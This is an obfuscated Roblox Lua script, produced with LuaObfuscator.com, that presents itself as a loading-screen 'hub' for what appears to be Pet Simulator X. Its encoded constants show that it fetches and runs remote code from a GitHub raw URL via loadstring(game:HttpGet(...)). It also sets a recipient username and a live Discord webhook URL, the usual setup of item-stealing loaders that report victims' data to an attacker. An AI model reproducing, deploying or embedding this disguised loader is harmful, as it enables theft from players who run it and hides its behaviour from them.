--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v83=0;while true do if (v83==0) then v19=v0(v3(v30,1,1));return "";end end else local v84=0;local v85;while true do if (v84==0) then v85=v2(v0(v30,16));if v19 then local v97=v5(v85,v19);v19=nil;return v97;else return v85;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v86=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-1)) + (620 -(555 + 64)))) ;return v86-(v86%(932 -(857 + 74))) ;else local v87=(570 -(367 + 201))^(v32-(928 -(214 + (1590 -(282 + 595))))) ;return (((v31%(v87 + v87))>=v87) and (1 + (1637 -(1523 + 114)))) or (0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0 + 0 ;local v36;local v37;while true do if (v35==(1 -0)) then return (v37 * (1321 -(16 + 52 + 997))) + v36 ;end if (v35==(1270 -(226 + 1044))) then v36,v37=v1(v16,v18,v18 + (8 -6) );v18=v18 + (119 -(32 + (1042 -(892 + 65)))) ;v35=1 + 0 ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + (7 -4) );v18=v18 + (6 -(182 -(67 + 113))) ;return (v41 * (30800116 -14022900)) + (v40 * 65536) + (v39 * (606 -(87 + 263))) + v38 ;end local function v24()local v42=0 + 0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(2 -1)) then v45=1 + 0 ;v46=(v20(v44,1487 -(998 + 488) ,20) * (((4 + 3) -(8 -3))^(984 -(802 + 150)))) + v43 ;v42=5 -3 ;end if (v42==(5 -(440 -(145 + 293)))) then if (v47==(0 + 0)) then if (v46==((1427 -(44 + 386)) -(915 + 82))) then return v48 * ((0 + 0) -0) ;else v47=1 + 0 ;v45=0 -0 ;end elseif (v47==(3234 -(1069 + 118))) then return ((v46==0) and (v48 * ((2 -1)/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(178 + 845) ) * (v45 + (v46/((2 + 0)^(92 -40)))) ;end if (v42==(0 + 0)) then v43=v23();v44=v23();v42=1;end if (v42==(793 -((1140 -(201 + 571)) + 423))) then v47=v20(v44,65 -44 ,49 -(10 + 8) );v48=((v20(v44,32)==(3 -(1140 -(116 + 1022)))) and  -1) or (443 -(416 + 26)) ;v42=(37 -28) -(4 + 2) ;end end end local function v25(v49)local v50;if  not v49 then v49=v23();if (v49==(0 -0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -(860 -(814 + 45)) );v18=v18 + v49 ;local v51={};for v67=3 -2 , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=283 -(125 + 158) ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52==0) then v53=1603 -(1417 + 186) ;v54=nil;v52=1;end if (v52==4) then while true do if (v53==(2 -0)) then local v95=0 -0 ;while true do if (v95==(4 -3)) then v53=1448 -(1290 + 155) ;break;end if (v95==(0 -0)) then v58=nil;v59=nil;v95=1 + 0 ;end end end if (v53~=1) then else v56=nil;v57=nil;v53=2;end if (0~=v53) then else local v96=0;while true do if (v96==(1 -0)) then v53=66 -(30 + 35) ;break;end if (v96==(0 + 0)) then v54=1257 -(1043 + 214) ;v55=nil;v96=3 -2 ;end end end if (v53~=3) then else v60=nil;while true do if (v54==(1213 -(323 + 889))) then local v98=0 -0 ;while true do if (v98==2) then v54=582 -(361 + 219) ;break;end if (v98==1) then for v151=321 -(53 + 267) ,v59 do local v152=0;local v153;local v154;local v155;local v156;while true do if ((0 + 0)==v152) then v153=413 -(15 + 398) ;v154=nil;v152=1;end if (v152~=2) then else while true do if (v153==(983 -(18 + 964))) then v156=nil;while true do if (v154==1) then if (v155==(3 -2)) then v156=v21()~=(0 + 0) ;elseif (v155==2) then v156=v24();elseif (v155==(2 + 1)) then v156=v25();end v60[v151]=v156;break;end if (v154==0) then local v175=850 -(20 + 830) ;local v176;while true do if (v175==(0 + 0)) then v176=0;while true do if (v176==(127 -(116 + 10))) then v154=1;break;end if (0~=v176) then else local v185=0;while true do if (v185~=(1 + 0)) then else v176=1;break;end if (v185==(738 -(542 + 196))) then local v187=0;while true do if (v187==1) then v185=1;break;end if (v187==(0 -0)) then v155=v21();v156=nil;v187=1;end end end end end end break;end end end end break;end if (v153==(0 + 0)) then local v172=0;local v173;while true do if (v172==0) then v173=0 + 0 ;while true do if (v173~=(1 + 0)) then else v153=2 -1 ;break;end if (v173~=(0 -0)) then else local v184=1551 -(1126 + 425) ;while true do if (v184==0) then v154=405 -(118 + 287) ;v155=nil;v184=3 -2 ;end if (v184==1) then v173=1122 -(118 + 1003) ;break;end end end end break;end end end end break;end if (1~=v152) then else v155=nil;v156=nil;v152=2;end end end v58[8 -5 ]=v21();v98=379 -(142 + 235) ;end if (v98==0) then v59=v23();v60={};v98=4 -3 ;end end end if ((1 + 1)==v54) then local v99=0;local v100;while true do if (v99~=0) then else v100=977 -(553 + 424) ;while true do local v157=0 -0 ;while true do if (v157~=(0 + 0)) then else if (v100==1) then return v58;end if (v100==0) then local v171=0 + 0 ;while true do if (v171~=(0 + 0)) then else for v177=1 + 0 ,v23() do local v178=0 + 0 ;local v179;local v180;local v181;while true do if (v178~=(2 -1)) then else v181=nil;while true do if (v179~=1) then else while true do if (v180==(0 -0)) then v181=v21();if (v20(v181,1,1)~=(0 -0)) then else local v188=0 + 0 ;local v189;local v190;local v191;local v192;local v193;local v194;while true do if (v188==(0 -0)) then v189=0;v190=nil;v188=754 -(239 + 514) ;end if (v188==1) then v191=nil;v192=nil;v188=2;end if (v188~=(1 + 1)) then else v193=nil;v194=nil;v188=1332 -(797 + 532) ;end if ((3 + 0)==v188) then while true do if (v189==(1 + 0)) then local v195=0 -0 ;while true do if (v195~=0) then else v192=nil;v193=nil;v195=1203 -(373 + 829) ;end if ((732 -(476 + 255))==v195) then v189=1132 -(369 + 761) ;break;end end end if (v189~=0) then else local v196=0 + 0 ;while true do if (v196==(0 -0)) then v190=0;v191=nil;v196=1 -0 ;end if (v196~=1) then else v189=239 -(64 + 174) ;break;end end end if (2==v189) then v194=nil;while true do if (v190==0) then local v197=0 + 0 ;while true do if (v197~=(1 -0)) then else v190=1;break;end if (v197~=0) then else v191=336 -(144 + 192) ;v192=nil;v197=217 -(42 + 174) ;end end end if (v190==2) then while true do if (v191==2) then local v200=0 + 0 ;local v201;while true do if (v200==(0 + 0)) then v201=0;while true do if (v201==0) then local v209=0 + 0 ;local v210;while true do if (v209==(1504 -(363 + 1141))) then v210=0;while true do if ((1581 -(1183 + 397))~=v210) then else v201=2 -1 ;break;end if (v210==(0 + 0)) then local v217=0 + 0 ;while true do if (v217==(1975 -(1913 + 62))) then if (v20(v193,1,1)==(1 + 0)) then v194[2]=v60[v194[5 -3 ]];end if (v20(v193,2,1935 -(565 + 1368) )==1) then v194[3]=v60[v194[11 -8 ]];end v217=1;end if (v217==1) then v210=1;break;end end end end break;end end end if (v201==1) then v191=1664 -(1477 + 184) ;break;end end break;end end end if (3==v191) then if (v20(v193,3 -0 ,3 + 0 )==(857 -(564 + 292))) then v194[6 -2 ]=v60[v194[11 -7 ]];end v55[v177]=v194;break;end if (v191~=(305 -(244 + 60))) then else local v203=0 + 0 ;local v204;while true do if (v203==0) then v204=0;while true do if (v204==0) then v194={v22(),v22(),nil,nil};if (v192==0) then local v213=0 + 0 ;local v214;local v215;while true do if (v213==1) then while true do if ((1125 -(936 + 189))==v214) then v215=0;while true do if (v215==(0 + 0)) then v194[1616 -(1565 + 48) ]=v22();v194[4]=v22();break;end end break;end end break;end if (v213==(0 + 0)) then v214=1138 -(782 + 356) ;v215=nil;v213=268 -(176 + 91) ;end end elseif (v192==(2 -1)) then v194[4 -1 ]=v23();elseif (v192==(1094 -(975 + 117))) then v194[3]=v23() -(2^(1891 -(157 + 1718))) ;elseif (v192~=(3 + 0)) then else local v220=0 -0 ;local v221;while true do if ((0 -0)~=v220) then else v221=0;while true do if (v221~=(1018 -(697 + 321))) then else v194[7 -4 ]=v23() -((3 -1)^16) ;v194[4]=v22();break;end end break;end end end v204=2 -1 ;end if (v204~=1) then else v191=2;break;end end break;end end end if (v191==0) then local v205=0 + 0 ;local v206;while true do if (v205==0) then v206=0 -0 ;while true do if (v206~=1) then else v191=1;break;end if (v206==(0 -0)) then local v211=1227 -(322 + 905) ;local v212;while true do if (v211==0) then v212=0;while true do if (v212~=0) then else local v219=0;while true do if (1==v219) then v212=612 -(602 + 9) ;break;end if (v219~=(1189 -(449 + 740))) then else v192=v20(v181,874 -(826 + 46) ,3);v193=v20(v181,4,6);v219=948 -(245 + 702) ;end end end if (v212~=1) then else v206=3 -2 ;break;end end break;end end end end break;end end end end break;end if (v190~=(1 + 0)) then else local v198=1898 -(260 + 1638) ;local v199;while true do if (v198==(440 -(382 + 58))) then v199=0;while true do if (v199~=(0 -0)) then else v193=nil;v194=nil;v199=1 + 0 ;end if (v199==1) then v190=3 -1 ;break;end end break;end end end end break;end end break;end end end break;end end break;end if (v179==0) then local v186=0;while true do if (v186~=0) then else v180=0 -0 ;v181=nil;v186=1206 -(902 + 303) ;end if (v186==(1 -0)) then v179=2 -1 ;break;end end end end break;end if (v178==(0 + 0)) then v179=1690 -(1121 + 569) ;v180=nil;v178=1;end end end for v182=215 -(22 + 192) ,v23() do v56[v182-(684 -(483 + 200)) ]=v28();end v171=1464 -(1404 + 59) ;end if (1==v171) then v100=1;break;end end end break;end end end break;end end end if (v54~=(0 -0)) then else local v101=0 -0 ;while true do if (0~=v101) then else local v147=765 -(468 + 297) ;while true do if ((563 -(334 + 228))~=v147) then else v101=3 -2 ;break;end if (v147==(0 -0)) then v55={};v56={};v147=1 -0 ;end end end if (v101==(1 + 0)) then local v148=0;while true do if (v148==(237 -(141 + 95))) then v101=2;break;end if (v148~=(0 + 0)) then else v57={};v58={v55,v56,nil,v57};v148=2 -1 ;end end end if (v101==2) then v54=1;break;end end end end break;end end break;end if (v52~=1) then else v55=nil;v56=nil;v52=2;end if (v52~=3) then else v59=nil;v60=nil;v52=3 + 1 ;end if (v52~=(2 + 0)) then else v57=nil;v58=nil;v52=3;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v88=0,v77 do if (v88>=v71) then v75[v88-v71 ]=v76[v88 + 1 ];else v79[v88]=v76[v88 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do v81=v69[v73];v82=v81[1];if (v82<=7) then if (v82<=3) then if (v82<=1) then if (v82>0) then for v138=v81[2],v81[3] do v79[v138]=nil;end else v79[v81[2]]=v63[v81[3]];end elseif (v82==2) then if (v81[2]==v79[v81[4]]) then v73=v73 + 1 ;else v73=v81[3];end else local v104;local v105,v106;local v107;local v108;v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v108=v81[2];v107=v79[v81[3]];v79[v108 + 1 ]=v107;v79[v108]=v107[v81[4]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v108=v81[2];v105,v106=v72(v79[v108](v13(v79,v108 + 1 ,v81[3])));v74=(v106 + v108) -1 ;v104=0;for v140=v108,v74 do v104=v104 + 1 ;v79[v140]=v105[v104];end v73=v73 + 1 ;v81=v69[v73];v108=v81[2];v79[v108]=v79[v108](v13(v79,v108 + 1 ,v74));v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]();v73=v73 + 1 ;v81=v69[v73];v73=v81[3];end elseif (v82<=5) then if (v82>4) then v79[v81[2]]=v81[3]~=0 ;else local v119=v81[2];local v120=v79[v81[3]];v79[v119 + 1 ]=v120;v79[v119]=v120[v81[4]];end elseif (v82==6) then local v124=0;while true do if (0==v124) then v63[v81[3]]=v79[v81[2]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v124=1;end if (v124==3) then v73=v81[3];break;end if (v124==2) then v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v124=3;end if (v124==1) then v73=v73 + 1 ;v81=v69[v73];v63[v81[3]]=v79[v81[2]];v73=v73 + 1 ;v124=2;end end else local v125=v81[2];local v126,v127=v72(v79[v125](v13(v79,v125 + 1 ,v81[3])));v74=(v127 + v125) -1 ;local v128=0;for v143=v125,v74 do v128=v128 + 1 ;v79[v143]=v126[v128];end end elseif (v82<=11) then if (v82<=9) then if (v82>8) then v63[v81[3]]=v79[v81[2]];else v79[v81[2]]=v81[3];end elseif (v82==10) then local v133=0;local v134;while true do if (v133==0) then v134=v81[2];v79[v134]=v79[v134](v13(v79,v134 + 1 ,v74));break;end end else v79[v81[2]]();end elseif (v82<=13) then if (v82>12) then if (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end else v79[v81[2]][v81[3]]=v81[4];end elseif (v82>14) then do return;end else v73=v81[3];end v73=v73 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!193O00028O00026O00084003023O005F4703053O00546578743303083O0052656164793O2E03053O005465787434030F3O005374617274696E6720536372697074026O00F03F026O001040030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756103083O00557365726E616D6503073O0048654461726B6E03073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31302O393035302O372O312O333233392O33372F6E34456A354946564F6D7165566D6F6753467A66355045594F5831575977357873487A4367503871382D695635504274626D39737461372D794C676F6B4E314C62573745027O004003053O005465787431030A3O004C6F6164696E673O2E03053O005465787432030C3O00507265706172696E673O2E030D3O006C6F6164696E677363722O656E03103O00437573746F6D5363726970744E616D6503093O00532O63656E20487562004F3O0012083O00014O0001000100013O00260D3O00020001000100040E3O00020001001208000100013O00260D000100140001000200040E3O00140001001208000200013O000E020001000F0001000200040E3O000F000100122O000300033O00300C00030004000500122O000300033O00300C000300060007001208000200083O00260D000200080001000800040E3O00080001001208000100093O00040E3O0014000100040E3O0008000100260D0001001E0001000900040E3O001E000100122O0002000A3O0012030003000B3O00202O00030003000C00122O0005000D6O000300056O00023O00024O00020001000100044O004E000100260D0001002D0001000100040E3O002D0001001208000200013O000E02000800250001000200040E3O00250001001208000100083O00040E3O002D000100260D000200210001000100040E3O002100010012080003000F3O0012060003000E3O00122O000300113O00122O000300103O00122O000200083O00044O0021000100260D0001003C0001001200040E3O003C0001001208000200013O00260D000200370001000100040E3O0037000100122O000300033O00300C00030013001400122O000300033O00300C000300150016001208000200083O00260D000200300001000800040E3O00300001001208000100023O00040E3O003C000100040E3O0030000100260D000100050001000800040E3O00050001001208000200013O00260D000200460001000100040E3O004600012O0005000300013O001209000300173O00122O000300033O00300C000300180019001208000200083O000E020008003F0001000200040E3O003F0001001208000100123O00040E3O0005000100040E3O003F000100040E3O0005000100040E3O004E000100040E3O000200012O000F3O00017O00",v9(),...);end
